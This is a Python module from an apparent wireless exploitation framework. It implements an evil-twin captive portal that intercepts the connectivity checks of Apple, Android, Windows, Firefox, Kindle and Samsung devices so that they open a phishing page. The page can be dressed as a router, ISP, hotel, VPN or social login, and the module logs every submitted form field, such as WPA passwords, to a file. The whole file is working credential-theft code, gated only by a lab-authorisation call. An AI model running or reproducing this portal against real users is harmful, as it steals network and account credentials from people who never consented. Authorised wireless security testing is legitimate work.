#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Connectivity-aware captive portal with OS detection.

Implements a captive portal HTTP server that detects and properly handles
OS-specific connectivity checks to force the native captive portal
popup/browser on the client device:

  - Apple (iOS/macOS): responds to /hotspot-detect.html, captive.apple.com
  - Google (Android/Chrome): responds to /generate_204, connectivitycheck.gstatic.com
  - Microsoft (Windows): responds to /connecttest.txt, /redirect, msftconnecttest
  - Firefox: responds to /success.txt (detectportal.firefox.com)

Inspired by Fluxion's connectivity response system and wifipumpkin3's captiveflask.

Version: 1.0.0
"""

from __future__ import annotations

import http.server
import json
import logging
from pathlib import Path
from typing import Dict
from urllib.parse import parse_qs

from wirelessxpl.core.exploit import *

from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

CONNECTIVITY_PATHS: Dict[str, str] = {
    "/hotspot-detect.html": "apple",
    "/library/test/success.html": "apple",
    "/generate_204": "google",
    "/gen_204": "google",
    "/connecttest.txt": "microsoft",
    "/redirect": "microsoft",
    "/ncsi.txt": "microsoft",
    "/success.txt": "firefox",
    "/canonical.html": "firefox",
    "/kindle-wifi/wifistub.html": "amazon",
    "/check_network_status.txt": "samsung",
}


class ConnectivityPortalHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP handler with OS connectivity detection and credential capture."""

    template_dir: str = ""
    cred_log: Path = Path(".log/portal_creds.json")
    portal_host: str = "10.0.0.1"

    def do_GET(self) -> None:
        path = self.path.split("?")[0]

        if path in CONNECTIVITY_PATHS:
            os_type = CONNECTIVITY_PATHS[path]
            logger.info("Connectivity check from %s (%s): %s",
                        self.client_address[0], os_type, path)

            if os_type == "apple":
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(
                    '<HTML><HEAD><TITLE>Success</TITLE></HEAD>'
                    '<BODY>Success</BODY></HTML>'.encode()
                )
            elif os_type == "google":
                self.send_response(302)
                self.send_header("Location", "http://{}/".format(self.portal_host))
                self.end_headers()
            elif os_type == "microsoft":
                self.send_response(302)
                self.send_header("Location", "http://{}/".format(self.portal_host))
                self.end_headers()
            elif os_type == "firefox":
                self.send_response(302)
                self.send_header("Location", "http://{}/".format(self.portal_host))
                self.end_headers()
            else:
                self.send_response(302)
                self.send_header("Location", "http://{}/".format(self.portal_host))
                self.end_headers()
            return

        if path == "/" or path == "/index.html":
            self.path = "/index.html"
        self.directory = self.template_dir
        super().do_GET()

    def do_POST(self) -> None:
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")
        params = parse_qs(body)

        cred_entry = {
            "client_ip": self.client_address[0],
            "user_agent": self.headers.get("User-Agent", ""),
            "params": {k: v[0] if len(v) == 1 else v for k, v in params.items()},
        }

        os_hint = "unknown"
        ua = (self.headers.get("User-Agent") or "").lower()
        if "iphone" in ua or "ipad" in ua or "mac" in ua:
            os_hint = "apple"
        elif "android" in ua:
            os_hint = "android"
        elif "windows" in ua:
            os_hint = "windows"
        cred_entry["os_hint"] = os_hint

        self.cred_log.parent.mkdir(parents=True, exist_ok=True)
        with open(self.cred_log, "a", encoding="utf-8") as f:
            f.write(json.dumps(cred_entry) + "\n")

        logger.info("Credential captured from %s (%s)", self.client_address[0], os_hint)

        self.send_response(302)
        self.send_header("Location", "/success.html")
        self.end_headers()

    def log_message(self, fmt, *args) -> None:
        logger.debug(fmt, *args)


class Exploit(Exploit):
    """OS-aware captive portal with connectivity detection."""

    __info__ = {
        "name": "Connectivity Portal",
        "description": (
            "Smart captive portal with OS connectivity detection: triggers "
            "native captive portal popup on Apple, Android, Windows, Firefox, "
            "Kindle, and Samsung devices. Supports 16+ vendor-branded templates "
            "for realistic WPA password capture."
        ),
        "authors": ("André Henrique (@mrhenrike) | União Geek",),
        "references": (
            "https://github.com/FluxionNetwork/fluxion",
            "https://github.com/P0cL4bs/wifipumpkin3",
        ),
        "devices": ("wifi",),
    }

    template = OptString(
        "tplink_generic",
        "Template: tplink_generic | netgear_generic | huawei_generic | asus_generic | "
        "dlink_generic | linksys_generic | fritzbox_generic | xfinity_login | "
        "vodafone_generic | firmware_update | oauth_social | isp_login | "
        "captive_hotel | corporate_vpn | wifi_connect | ble_pair_spoof",
    )
    custom_template_dir = OptString("", "Custom template directory (overrides template)")
    portal_port = OptInteger(80, "HTTP port for portal")
    portal_ip = OptString("10.0.0.1", "Portal IP (rogue AP gateway)")
    credentials_file = OptString(".log/portal_creds.json", "Credentials output file")
    dry_run = OptBool(False, "Print config without executing")

    AVAILABLE_TEMPLATES = (
        "tplink_generic", "netgear_generic", "huawei_generic",
        "asus_generic", "dlink_generic", "linksys_generic",
        "fritzbox_generic", "xfinity_login", "vodafone_generic",
        "firmware_update", "oauth_social", "isp_login",
        "captive_hotel", "corporate_vpn", "wifi_connect", "ble_pair_spoof",
    )

    def _resolve_template(self) -> Path:
        """Resolve template directory."""
        if self.custom_template_dir:
            p = Path(self.custom_template_dir)
            if p.is_dir():
                return p

        resources = Path(__file__).resolve().parents[3] / "resources" / "phishing_pages"
        tpl = resources / self.template
        if tpl.is_dir():
            return tpl

        print_error("Template '{}' not found. Available: {}".format(
            self.template, ", ".join(self.AVAILABLE_TEMPLATES)))
        return Path("")

    def run(self) -> None:
        """Start connectivity-aware captive portal."""
        require_authorised_lab()

        tpl_dir = self._resolve_template()
        if not tpl_dir or not tpl_dir.is_dir():
            return

        if self.dry_run:
            print_info("DRY RUN — Connectivity Portal")
            print_info("Template: {} ({})".format(self.template, tpl_dir))
            print_info("Port: {} | IP: {}".format(self.portal_port, self.portal_ip))
            print_info("\nOS connectivity detection paths:")
            for path, os_name in CONNECTIVITY_PATHS.items():
                print_info("  {} → {}".format(path, os_name))
            return

        ConnectivityPortalHandler.template_dir = str(tpl_dir)
        ConnectivityPortalHandler.cred_log = Path(self.credentials_file)
        ConnectivityPortalHandler.portal_host = self.portal_ip

        server = http.server.HTTPServer(("0.0.0.0", self.portal_port), ConnectivityPortalHandler)

        print_status("Connectivity Portal on port {}".format(self.portal_port))
        print_info("Template: {}".format(self.template))
        print_info("Gateway IP: {}".format(self.portal_ip))
        print_info("Credentials: {}".format(self.credentials_file))
        print_info("Detecting: Apple CNA, Google, Windows NCSI, Firefox, Kindle, Samsung")
        print_info("Press Ctrl+C to stop.")

        try:
            server.serve_forever()
        except KeyboardInterrupt:
            server.shutdown()

        cred_log = Path(self.credentials_file)
        if cred_log.exists():
            count = sum(1 for _ in open(cred_log, encoding="utf-8"))
            print_success("Captured {} credential entries → {}".format(count, cred_log))
